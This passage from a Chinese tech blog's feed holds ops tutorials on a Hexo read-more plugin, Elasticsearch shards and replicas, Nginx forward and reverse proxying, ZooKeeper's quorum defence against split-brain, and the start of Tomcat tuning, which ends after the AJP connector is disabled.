<h4 id="导流公众号设定"><a href="#导流公众号设定" class="headerlink" title="导流公众号设定"></a>导流公众号设定</h4><p>增长工具–&gt;添加–&gt;填写信息–&gt;保存</p>
<p><img src="/articles/36a9dafd/4.png" alt></p>
<p><img src="/articles/36a9dafd/5.png" alt></p>
<p>注意：保存好后，需要再次到增长工具–&gt;博客导流公众号–&gt;使用</p>
<p><img src="/articles/36a9dafd/6.png" alt></p>
<p>然后会展示使用指南</p>
<p><img src="/articles/36a9dafd/7.png" alt></p>
<h4 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h4><p>在hexo <code>_config.yml</code> 配置文件中,添加配置 <code>readmore</code> 插件相关信息</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># readmore</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="attr">  readmore:</span></span><br><span class="line"><span class="attr">    blogId:</span> <span class="number">19128</span><span class="bullet">-1577246103864</span><span class="bullet">-519</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">豌豆多多追梦记</span></span><br><span class="line"><span class="attr">    qrcode:</span> <span class="attr">https://wandouduoduo.github.io/about/index/gongzhonghao.jpg</span></span><br><span class="line"><span class="attr">    keyword:</span> <span class="string">vip</span></span><br></pre></td></tr></table></figure>

<p>其中,配置参数含义如下:</p>
<ul>
<li><code>blogId</code> : [必选]OpenWrite 后台申请的博客唯一标识,例如:119128-1577246103864-519</li>
<li><code>name</code> : [必选]OpenWrite 后台申请的博客名称,例如:豌豆多多追梦记</li>
<li><code>qrcode</code> : [必选]OpenWrite 后台申请的微信公众号二维码图片地址。</li>
<li><code>keyword</code> : [必选]OpenWrite 后台申请的微信公众号后台回复关键字,例如:vip</li>
</ul>
<p>注意: <strong>一定要替换成自己的在使用指南中显示的相关配置</strong>!</p>
<h4 id="Hexo安装组件"><a href="#Hexo安装组件" class="headerlink" title="Hexo安装组件"></a>Hexo安装组件</h4><p>开通readmore功能，原本需要手动更改主题的配置文件，但现在有牛人进行了封装。有兴趣可以看下</p>
<p><a href="https://github.com/snowdreams1006/hexo-plugin-readmore" target="_blank" rel="noopener">hexo-plugin-readmore</a>。所以我们现在只需要安装即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-plugin-readmore --save</span><br><span class="line">或</span><br><span class="line">cnpm install hexo-plugin-readmore --save</span><br></pre></td></tr></table></figure>

<h4 id="构建发布"><a href="#构建发布" class="headerlink" title="构建发布"></a>构建发布</h4><p>插件安装完成后，保存配置，构建发布即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>打开hexo博客，随便打开一篇文档，查看是否有效果。Good   Luck!!!</p>
<p><img src="/articles/36a9dafd/8.png" alt></p>
]]></content>
      <categories>
        <category>心得体会</category>
        <category>使用技巧</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Elasticsearch分片副本机制</title>
    <url>/articles/688d9226.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>日常运维工作中，保证系统服务的稳定是第一优先级的。做好高可用方案是关键。在用Elasticsearch作为存储的服务中，保证Elasticsearch数据的高可用，数据的安全性和一致性至关重要。本文就针对这一问题详细介绍了Elasticsearch的分片和副本机制。</p>
<a id="more"></a>



<h2 id="分片和副本机制"><a href="#分片和副本机制" class="headerlink" title="分片和副本机制"></a>分片和副本机制</h2><ol>
<li><p>index(索引) 包含多个 shard(分片)，创建 index 时可以在settings中设置分片数，不设置时默认是5个。</p>
</li>
<li><p>每个 shard 都是一个最小工作单元，承载部分数据；每个 shard 都是一个 lucene 实例，并且具有完整的建立索引和处理能力。</p>
</li>
<li><p>增减节点时，shard 会自动在 nodes 中负载均衡。</p>
</li>
<li><p>primary shard（主分片） 和 replica shard（副本分片），每个 document 肯定只存在于某一个 primary shard 以及对应的 replica shard 中，不可能存在于多个 primary shard 。</p>
<p><img src="/articles/688d9226/1.png" alt></p>
</li>
<li><p>replica shard 是 primary shard 的副本，负责容错，以及承担读请求负载。</p>
</li>
<li><p>primary shard 的数量在创建索引的时候就固定了，不可更改；replica shard 的数量可以随时修改。</p>
</li>
<li><p>primary shard 的默认数量是5，replica 默认是1，默认有10个 shard，5个 primary shard ，5个 replica shard 。</p>
</li>
<li><p>primary shard 不能和自己的 replica shard 放在同一个节点上，否则节点宕机，primary shard 和副本都丢失，容错机制将失效；但是可以和其他 primary shard 的 replica shard 放在同一个节点上。</p>
<p><img src="/articles/688d9226/2.png" alt></p>
</li>
</ol>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>Shards分片个数:  3</p>
<p>Replica副本个数：3</p>
<h4 id="单节点环境下"><a href="#单节点环境下" class="headerlink" title="单节点环境下"></a>单节点环境下</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /myindex</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot;: 3,</span><br><span class="line">        &quot;number_of_replica&quot;: 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 查看集群健康状态 --- 将返回yellow，说明集群状态不健康</span><br><span class="line">GET _cat/health</span><br></pre></td></tr></table></figure>

<p>此时，因为是单节点环境，3个 primary shard 只能分配到这个仅有的 node 上，另外3个 replica shard 是无法分配的（一个 shard 的副本 replica，两个是不能在同一个节点），集群可以正常工作；但出现宕机，数据全部丢失，而且集群不可用，无法接受任何请求。</p>
<h4 id="两个节点环境下"><a href="#两个节点环境下" class="headerlink" title="两个节点环境下"></a>两个节点环境下</h4><p>将3个 primary shard 分配到一个 node 上，另外3个 replica shard 分配到另一个节点上；<br>primary shard 和 replica shard 保持同步；<br>primary shard 和 replica shard 都可以处理客户端的读请求。</p>
<p><img src="/articles/688d9226/3.png" alt></p>
<h4 id="三个节点环境下"><a href="#三个节点环境下" class="headerlink" title="三个节点环境下"></a>三个节点环境下</h4><p>将3个 primary shard 分别分配到一个 node 上，另外3个 replica shard 也交叉分配到另一个节点上；</p>
<p><img src="/articles/688d9226/1.png" alt></p>
<p>这样3个节点都可以负载均衡增大访问量，同时如果一台服务器宕机后，数据也不会丢失，还可以对外正常提供服务。保证了服务的高可用和数据的安全。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>建议:  primary shard的个数和集群节点数一致，replica shard 数可以根据业务需求量决定，需求量大可以设定多个replica shard，来增加读取操作。但是至少每个primary shard设置1个replica shard，来保证高可用和数据的安全性。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>Elasticsearch</category>
      </categories>
      <tags>
        <tag>Elasticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx之正反代理详解</title>
    <url>/articles/c5ecc6c0.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常运维工作中，常常会用到反向代理，为了更安全同时为了负载均衡，分担压力。</p>
<p>那么，有小伙伴就会有疑问：</p>
<ul>
<li>什么是反向代理？</li>
<li>负载均衡又是怎么实现的？</li>
<li>有反向代理那有正向代理吗？</li>
<li>正向代理的应用场景是怎样的？</li>
<li>反向代理和正向代理怎么配置实现呢？</li>
</ul>
<p>带着这些疑问，就给大家详细解释下nginx的正反向代理。</p>
<a id="more"></a>



<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Nginx（Nginx是一款自由的、开源的、高性能的HTTP服务器。功能优势等等这里就不再赘述了。度娘那里有很多信息。）</p>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>说到代理，首先我们要明确一个概念，所谓代理就是一个代表、一个渠道；</p>
<p>此时就设计到两个角色，一个是被代理角色，一个是目标角色，被代理角色通过这个代理访问目标角色完成一些任务的过程称为代理操作过程；如同生活中的专卖店~客人到adidas专卖店买了一双鞋，这个专卖店就是代理，被代理角色就是adidas厂家，目标角色就是用户。</p>
<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>我们在运维的日常工作中经常用到负载均衡，所以接触反向代理比较多，那么反向代理是怎样的呢？。例如人气比较高的网站，如淘宝，京东等等。每天访问人数的人很多，数以万计，此时单台服务器远远不能承载所有人的访问请求，这时作为资深运维人员就需要对web服务进行分布式部署；何为分布式部署呢？就是通过部署多台服务器组成web集群共同来处理访问请求，解决单台服务器不能承载的问题；分布式部署的web服务可以横行扩展。而实现web分布式部署通常要用到反向代理。apache或nginx都可以。本文以nginx为例，用nginx的反向代理实现的。国内公司通过把nginx和其他的组件进行封装，根据场景或侧重点不同，便于构建安装，就有了：Tengine或OpenResty等。有兴趣的朋友可以度娘搜索学习。那么反向代理具体是通过什么样的方式实现的分布式的集群操作呢，我们先看一个示意图：</p>
<p><img src="/articles/c5ecc6c0/2.png" alt></p>
<p>通过上述的图解大家就可以看清楚了，多个客户端给服务器发送的请求，nginx服务器接收到之后，按照一定的规则分发给了后端的web服务器进行处理了。此时请求的来源也就是客户端是明确的，但是请求后具体由哪台服务器进行处理响应并不明确了，web服务（nginx）扮演的就是一个反向代理角色。</p>
<p>反向代理，主要用于服务器集群分布式部署负载均衡共同承载请求压力或安全需求等的情况下使用，反向代理可以隐藏了响应服务器的信息，能够过滤网络攻击，保证安全。</p>
<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>阴阳两仪生万物，有阴就有阳，有反就有正。说完反向代理了，我们再来看看正向代理。正向代理可能在日常工作中用的不是很多，但是，相信大家经常听到：翻墙这个词，何为翻墙呢？翻墙是因为大陆对网络中攻击等等进行了屏蔽和过滤，相当于防火墙的墙一样，允许的我们才可以访问，屏蔽的我们就不能访问。这是我们做技术的如果需要在国外查询技术文档等就需要翻墙，通常我们需要购买vpn来实现，vpn的功能就是用的正向代理。那么vpn是怎么实现的呢？我们如果需要访问国外的某些网站，此时你会发现位于国外的某网站我们通过浏览器是没有办法访问的，被屏蔽过滤掉了。vpn的方式就是找一个可以正常访问国外网站的代理服务器，我们将请求发送给代理服务器，然后代理服务器去访问国外的网站，然后将访问到的数据传递给我们！</p>
<p>上述描述的代理模式称为正向代理，正向代理的特点是：客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，但是不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。如下图</p>
<p><img src="/articles/c5ecc6c0/1.png" alt></p>
<h2 id="正反向代理共同使用"><a href="#正反向代理共同使用" class="headerlink" title="正反向代理共同使用"></a>正反向代理共同使用</h2><p>日常在实际项目操作中，正向代理和反向代理会搭配使用。正向代理代理客户端的请求去访问目标服务器，而目标服务器是又使用反向代理服务器，反向代理多台真实的业务处理服务器，进行负载均衡。具体的拓扑图如下：</p>
<p><img src="/articles/c5ecc6c0/2.jpg" alt></p>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>我们知道了代理服务器，也一直说负载均衡，何为负载均衡呢？简单的说：web服务（nginx）作为反向代理服务器，依据一定的规则对请求进行分发，把请求平均让后端业务服务器进行响应，已达到分担压力的作用。负载就是客户端对业务发送的请求，分发到不同的服务器处理的规则，就是一种均衡规则。将服务器接收到的请求按照规则分发的过程，就是负载均衡。</p>
<p>负载均衡，有硬件负载均衡和软件负载均衡两种，硬件负载均衡也称为硬负载，如F5负载均衡，但是相对造价昂贵成本较高，但是数据的稳定性安全性等等有非常好的保障，如国有企业三大运营商这样的公司才会选择硬负载进行操作；通常公司都会考虑到成本问题，会选择使用软件负载均衡，软件负载均衡是利用现有的技术结合主机硬件实现的一种消息队列分发机制。软件负载均衡肯定和硬负载没发比较的，但是成本较低，稳定性和安全性在架构优化后在可接受范围，广为使用。</p>
<p>nginx的负载均衡规则如下：</p>
<ul>
<li><strong>weight轮询（默认</strong>）：接收到的请求按照顺序逐一分配到不同的后端服务器，即使在使用过程中，某一台后端服务器宕机，nginx会自动将该服务器剔除出队列，请求受理情况不会受到任何影响。 这种方式下，可以给不同的后端服务器设置一个权重值（weight），用于调整不同的服务器上请求的分配率；权重数据越大，被分配到请求的几率越大；该权重值，主要是针对实际工作环境中不同的后端服务器硬件配置进行调整的。</li>
<li><strong>ip_hash</strong>：每个请求按照发起客户端的ip的hash结果进行匹配，这样的算法下一个固定ip地址的客户端总会访问到同一个后端服务器，这也在一定程度上解决了集群部署环境下session共享的问题。</li>
<li><strong>fair</strong>：智能调整调度算法，动态的根据后端服务器的请求处理到响应的时间进行均衡分配，响应时间短处理效率高的服务器分配到请求的概率高，响应时间长处理效率低的服务器分配到的请求少；结合了前两者的优点的一种调度算法。但是需要注意的是nginx默认不支持fair算法，如果要使用这种调度算法，请安装upstream_fair模块</li>
<li><strong>url_hash</strong>：按照访问的url的hash结果分配请求，每个请求的url会指向后端固定的某个服务器，可以在nginx作为静态服务器的情况下提高缓存效率。同样要注意nginx默认不支持这种调度算法，要使用的话需要安装nginx的hash软件包</li>
</ul>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>了解了正反向代理和负载均衡，那么要怎么实现呢？如何去配置。</p>
<h4 id="正向代理配置"><a href="#正向代理配置" class="headerlink" title="正向代理配置"></a><strong>正向代理配置</strong></h4><p>现在我登录上代理服务器上, 打开/etc/nginx/conf.d/default.conf<br>添加<code>resolver</code>和<code>proxy_pass</code>,设置如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost nginx.tangll.cn;</span><br><span class="line"></span><br><span class="line">    resolver 8.8.8.8;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://$http_host$request_uri;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>resolver</code>为DNS解析,这里填写的IP为Google提供的免费DNS服务器的IP地址。<br><code>proxy_pass</code>配置代理转发。<br>至此便是配置了代理服务器，所有访问请求全部都通过代理服务器转发,<code>$http_host</code>就是我们要访问的主机名,<code>$request_uri</code>就是我们后面所加的参数。<br>简单的说至此就是相当于配置好了我们请求了代理服务器,代理服务器再去请求我们所请求的地址。</p>
<p>然后，只需要在本机系统或浏览器配置代理即可访问。</p>
<h6 id="windows配置"><a href="#windows配置" class="headerlink" title="windows配置"></a><strong>windows配置</strong></h6><p><img src="/articles/c5ecc6c0/3.png" alt></p>
<h6 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a><strong>Linux系统</strong></h6><p><strong>使用yum 的设置代理的方法</strong></p>
<p>如果只需要使用yum来更新包的，只需进行yum配置即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/yum.conf </span></span><br><span class="line">proxy=http://192.168.99.99:80</span><br><span class="line"><span class="comment">#proxy=ftp://192.168.99.99:80</span></span><br><span class="line"><span class="comment">#proxy_username=username                 #####代理的用户名</span></span><br><span class="line"><span class="comment">#proxy_password=password                  #####代理的密码</span></span><br><span class="line"><span class="comment">#然后直接用yum安装即可</span></span><br></pre></td></tr></table></figure>

<p><strong>wget设置代理的方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/wgetrc</span></span><br><span class="line">http_proxy=192.168.99.99:80</span><br><span class="line">http_proxy=192.168.99.99:443</span><br></pre></td></tr></table></figure>

<p><strong>curl访问代理设置的方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如果访问HTTP网站，可以直接这样的方式: curl --proxy proxy_server:80 http://www.taobao.com/</span></span><br><span class="line"><span class="comment">#如果访问HTTPS网站，例如https://www.alipay.com，那么可以使用nginx的HTTPS转发的server：</span></span><br><span class="line">curl --proxy proxy_server:443 http://www.alipay.com</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># curl -I --proxy 192.168.99.99:80 www.baidu.com    ###显示http访问的状态码</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">备注：上边有介绍，详见上边内容。</span><br></pre></td></tr></table></figure>

<p><strong>使用设置全局代理的方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/profile</span></span><br><span class="line">http_proxy = http://192.168.99.99:80</span><br><span class="line">http_proxy = http://192.168.99.99:443</span><br><span class="line">ftp_proxy = http://192.168.99.99:80/</span><br><span class="line"><span class="built_in">export</span> http_proxy</span><br><span class="line"><span class="built_in">export</span> ftp_proxy</span><br></pre></td></tr></table></figure>

<h4 id="反向代理配置"><a href="#反向代理配置" class="headerlink" title="反向代理配置"></a>反向代理配置</h4><p>反向代理的演示更为简单一些。<br>首先在/etc/nginx/conf.d/下新建一个default.conf:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost nginx.tangll.cn;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    #设置代理</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504 404  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>代理服务器站在客户端那边就是正向代理，代理服务器站在原始服务器那边就是反向代理, Nginx通过<code>proxy_pass</code>可以设置代理服务。</p>
]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper集群脑裂探讨</title>
    <url>/articles/f714eb8e.html</url>
    <content><![CDATA[<h2 id="什么是脑裂"><a href="#什么是脑裂" class="headerlink" title="什么是脑裂"></a>什么是脑裂</h2><p>脑裂(split-brain)就是“大脑分裂”，也就是本来一个“大脑”被拆分了两个或多个“大脑”，我们都知道，如果一个人有多个大脑，并且相互独立的话，那么会导致人体“手舞足蹈”，“不听使唤”。</p>
<p>脑裂通常会出现在集群环境中，比如ElasticSearch、Zookeeper集群，而这些集群环境有一个统一的特点，就是它们有一个大脑，比如ElasticSearch集群中有Master节点，Zookeeper集群中有Leader节点。</p>
<p>本篇文章着重来给大家讲一下Zookeeper中的脑裂问题，以及是如果解决脑裂问题的。</p>
<a id="more"></a>



<h2 id="集群脑裂场景"><a href="#集群脑裂场景" class="headerlink" title="集群脑裂场景"></a>集群脑裂场景</h2><hr>
<p>对于一个集群，想要提高这个集群的可用性，通常会采用多机房部署，比如现在有一个由6台zkServer所组成的一个集群，部署在了两个机房：</p>
<p><img src="/articles/f714eb8e/2.png" alt="img"></p>
<p>正常情况下，此集群只会有一个Leader，那么如果机房之间的网络断了之后，两个机房内的zkServer还是可以相互通信的，如果<strong>不考虑过半机制</strong>，那么就会出现每个机房内部都将选出一个Leader。<img src="/articles/f714eb8e/1.png" alt="img"></p>
<p>这就相当于原本一个集群，被分成了两个集群，出现了两个“大脑”，这就是脑裂。</p>
<p>对于这种情况，我们也可以看出来，原本应该是统一的一个集群对外提供服务的，现在变成了两个集群同时对外提供服务，如果过了一会，断了的网络突然联通了，那么此时就会出现问题了，两个集群刚刚都对外提供服务了，数据该怎么合并，数据冲突怎么解决等等问题。</p>
<p>刚刚在说明脑裂场景时，有一个前提条件就是没有考虑过半机制，所以实际上Zookeeper集群中是不会出现脑裂问题的，而不会出现的原因就跟过半机制有关。</p>
<h2 id="过半机制"><a href="#过半机制" class="headerlink" title="过半机制"></a>过半机制</h2><p>在领导者选举的过程中，如果某台zkServer获得了超过半数的选票，则此zkServer就可以成为Leader了。</p>
<p>过半机制的源码实现其实非常简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuorumMaj</span> <span class="keyword">implements</span> <span class="title">QuorumVerifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG = LoggerFactory.getLogger(QuorumMaj.class);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> half;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// n表示集群中zkServer的个数（准确的说是参与者的个数，参与者不包括观察者节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">QuorumMaj</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.half = n/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证是否符合过半机制</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsQuorum</span><span class="params">(Set&lt;Long&gt; set)</span></span>&#123;</span><br><span class="line">        <span class="comment">// half是在构造方法里赋值的</span></span><br><span class="line">        <span class="comment">// set.size()表示某台zkServer获得的票数</span></span><br><span class="line">        <span class="keyword">return</span> (set.size() &gt; half);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大家仔细看一下上面方法中的注释，核心代码就是下面两行：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">this.half = n/2;return (set.size() &gt; half);</span><br></pre></td></tr></table></figure>

<p>举个简单的例子：如果现在集群中有5台zkServer，那么half=5/2=2，那么也就是说，领导者选举的过程中至少要有三台zkServer投了同一个zkServer，才会符合过半机制，才能选出来一个Leader。</p>
<p>那么有一个问题我们想一下，<strong>选举的过程中为什么一定要有一个过半机制验证？</strong>因为这样不需要等待所有zkServer都投了同一个zkServer就可以选举出来一个Leader了，这样比较快，所以叫快速领导者选举算法呗。</p>
<p>那么再来想一个问题，<strong>过半机制中为什么是大于，而不是大于等于呢？</strong></p>
<p>这就是更脑裂问题有关系了，比如回到上文出现脑裂问题的场景：<img src="/articles/f714eb8e/3.png" alt="img"></p>
<p>当机房中间的网络断掉之后，机房1内的三台服务器会进行领导者选举，但是此时过半机制的条件是set.size() &gt; 3，也就是说至少要4台zkServer才能选出来一个Leader，所以对于机房1来说它不能选出一个Leader，同样机房2也不能选出一个Leader，这种情况下整个集群当机房间的网络断掉后，整个集群将没有Leader。没有Leader对外就不能提供服务。</p>
<p>而如果过半机制的条件是set.size() &gt;= 3，那么机房1和机房2都会选出一个Leader，这样就出现了脑裂。所以我们就知道了，为什么过半机制中是<strong>大于</strong>，而不是<strong>大于等于</strong>。就是为了防止脑裂。</p>
<p>如果假设我们现在只有5台机器，也部署在两个机房：<img src="/articles/f714eb8e/4.png" alt="img"></p>
<p>此时过半机制的条件是set.size() &gt; 2，也就是至少要3台服务器才能选出一个Leader，此时机房件的网络断开了，对于机房1来说是没有影响的，Leader依然还是Leader，对于机房2来说是选不出来Leader的，此时整个集群中只有一个Leader。</p>
<p>所以，我们可以总结得出，有了过半机制，对于一个Zookeeper集群，要么没有Leader，要没只有1个Leader，这样就避免了脑裂问题。</p>
<h2 id="奇偶节点数探讨"><a href="#奇偶节点数探讨" class="headerlink" title="奇偶节点数探讨"></a>奇偶节点数探讨</h2><p>命题：A,B两个机房5个节点和6个节点zookeeper节点比较。</p>
<p>5个节点：A机房3个，B机房2个。如果网络出现中断，根据过半机制原则, 大于2个节点就可以选举出来leader。那么结果就是A机房3个节点大于2，就可以正常选举出来Leader。B节点不大于2，不能选举出Leader。这时集群还是可以正常对外提供服务，只是节点少两个而已。当网络恢复后，B机房节点再加入到集群，集群恢复。</p>
<p>6个节点：A机房3个，B机房3个。如果网络出现中断，根据过半机制原则, 大于3个节点才可以选举出来leader。那么结果就是A机房3个节点不大于3，B节点也不大于3，两个机房都不能选举出Leader。而没有Leader集群就不能对外提供服务，造成整个集群不可用。违背了高可用的初衷。并且还多用一台服务器，还有搭建和维护成本。而且和5个节点冗余是一样的。</p>
<p>可能有同学会说那A机房4个，B节点2个不就可以了。是的，这样是可以，但是偶数是存在3，3分布的这种情况。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上所述，为了保证zookeeper集群高可用，防止脑裂。建议用奇数个zk节点，当然是大于2的奇数。奇数个zk节点有两个好处：1，奇数个节点可用节省一个节点的资源（服务器和部署及维护成本）。2，如为偶数个节点，因为过半机制的设定，有可能出现没有leader，造成整个集群不可以。</p>
]]></content>
      <categories>
        <category>自动化</category>
        <category>Zookeeper</category>
      </categories>
      <tags>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat最强优化</title>
    <url>/articles/a315956e.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文不在于给出最佳配置，而是带领开发者，能够从实际情况出发，通过不断的调节tomcat和jvm参数，去发现吞吐量，平均响应时间和错误率等信息的变化，同时根据服务器的cpu和内存等信息，结合接口的业务逻辑，最好是测试使用率最高，并发最大，或者是最重要的接口(比如下单支付接口)，设置最优的tomcat和jvm配置参数。通过Tomcat性能优化可以提高网站的并发能力。Tomcat服务器在JavaEE项目中使用率非常高，所以在生产环境对Tomcat的优化也变得非常重要了。</p>
<a id="more"></a>



<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>对于Tomcat的优化，主要是从2个方面入手：</p>
<p>一是<strong>Tomcat自身的配置</strong>，另一个是<strong>Tomcat所运行的jvm虚拟机的调优</strong>。</p>
<h2 id="硬件资源"><a href="#硬件资源" class="headerlink" title="硬件资源"></a>硬件资源</h2><p>服务器所能提供CPU、内存、硬盘的性能对处理能力有决定性影响。硬件我们不说了，这个方面是钱越多越好是吧。</p>
<h2 id="Tomcat配置优化"><a href="#Tomcat配置优化" class="headerlink" title="Tomcat配置优化"></a>Tomcat配置优化</h2><h4 id="管理界面"><a href="#管理界面" class="headerlink" title="管理界面"></a>管理界面</h4><p>Linux环境安装运行Tomcat8，具体的安装步骤省略 (官网下载，解压即可)。</p>
<p><a href="https://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">Tomcat官网</a></p>
<p>如果需要登录系统，必须配置tomcat用户，在安装完Tomcat后，进行如下操作</p>
<p>在 <strong>/conf/tomcat-users.xml</strong>  文件中的 <tomcat-users> 标签里面添加如下内容</tomcat-users></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 修改配置文件，配置tomcat的管理用户 --&gt;</span><br><span class="line">&lt;role rolename=&quot;manager&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;admin-gui,admin,manager-gui,manager&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>如果是tomcat7，配置了tomcat用户就可以登录系统了，但是tomcat8中不行，还需要修改另一个配置文件，否则访问不了，提示403，打开 <code>webapps/manager/META-INF/context.xml</code>文件</p>
<p>启动Tomcat。(下图为默认配置启动)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bin/startup.sh</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a315956e/1.png" alt></p>
<p>打开浏览器进行访问<a href="http://10.93.165.61:8080/" target="_blank" rel="noopener">http://10.93.165.61:8080/</a>,  点击“Server Status”，输入用户名/密码进行登陆tomcat/tomcat</p>
<p><img src="/articles/a315956e/2.png" alt></p>
<p>登录之后可以看到服务器状态等信息，主要包括服务器信息，JVM，ajp和http信息</p>
<p><img src="/articles/a315956e/3.png" alt></p>
<h4 id="AJP连接"><a href="#AJP连接" class="headerlink" title="AJP连接"></a>AJP连接</h4><p>在服务状态页面中可以看到，默认状态下会启用AJP服务，并且占用8009端口。</p>
<p><img src="/articles/a315956e/4.png" alt></p>
<p><strong>什么是AJP</strong></p>
<p>AJP（Apache JServer Protocol）<br>AJPv13协议是面向包的。WEB服务器和Servlet容器通过TCP连接来交互；为了节省SOCKET创建的昂贵代价，WEB服务器会尝试维护一个永久TCP连接到servlet容器，并且在多个请求和响应周期过程会重用连接。</p>
<p><img src="/articles/a315956e/5.png" alt></p>
<p>我们一般是使用Nginx+Tomcat的架构，所以用不着AJP协议，把AJP连接器禁用。</p>
<p>修改conf下的server.xml文件，将AJP服务禁用掉即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 禁用AJP连接 --&gt;</span><br><span class="line">&lt;!-- &lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; --&gt;</span><br></pre></td></tr></table></figure>

<p>重启tomcat，查看效果。可以看到AJP服务已经不存在了。</p>
<p><img src="/articles/a315956e/6.png" alt></p>
